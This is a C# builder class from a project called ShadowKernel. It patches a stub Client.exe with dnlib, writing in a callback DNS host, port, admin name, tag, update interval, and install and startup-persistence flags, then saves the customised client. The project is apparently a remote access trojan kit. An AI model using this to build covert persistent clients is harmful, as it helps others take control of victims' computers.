using System;
using System.IO;
using System.Linq;
using dnlib.DotNet;

namespace ShadowKernel.Classes
{
    internal class Builder
    {
        //Build client
        public void BuildClient(string Port, string Admin, string DNS, string Name, string ClientTag, string UpdateInterval,
            string Install, string Startup)
        {
            ClientSettings.DNS = DNS;
            ClientSettings.Port = Port;
            ClientSettings.Admin = Admin;
            ClientSettings.ClientTag = ClientTag;
            ClientSettings.UpdateInterval = UpdateInterval;
            ClientSettings.Install = Install == "True" ? "True" : "False";
            ClientSettings.Startup = Startup == "True" ? "True" : "False";           
            string FullName = "Client.ClientSettings";
            
            var Assembly = AssemblyDef.Load("Client.exe");
            var Module = Assembly.ManifestModule;
            if (Module != null)
            {
                var Settings = Module.GetTypes().Where(type => type.FullName == FullName).FirstOrDefault();
                if (Settings != null)
                {
                    var Constructor = Settings.FindMethod(".cctor");
                    if (Constructor != null)
                    {
                        Constructor.Body.Instructions[0].Operand = ClientSettings.DNS;
                        Constructor.Body.Instructions[2].Operand = ClientSettings.Admin;
                        Constructor.Body.Instructions[4].Operand = ClientSettings.Port;
                        Constructor.Body.Instructions[6].Operand = ClientSettings.ClientTag;
                        Constructor.Body.Instructions[8].Operand = ClientSettings.UpdateInterval;
                        Constructor.Body.Instructions[10].Operand = ClientSettings.Install;
                        Constructor.Body.Instructions[12].Operand = ClientSettings.Startup;
                        if (!Directory.Exists(Environment.CurrentDirectory + @"\Clients"))
                            Directory.CreateDirectory(Environment.CurrentDirectory + @"\Clients");
                        try { Assembly.Write(Name); } catch { }
                    }
                }
            }
        }
    }
}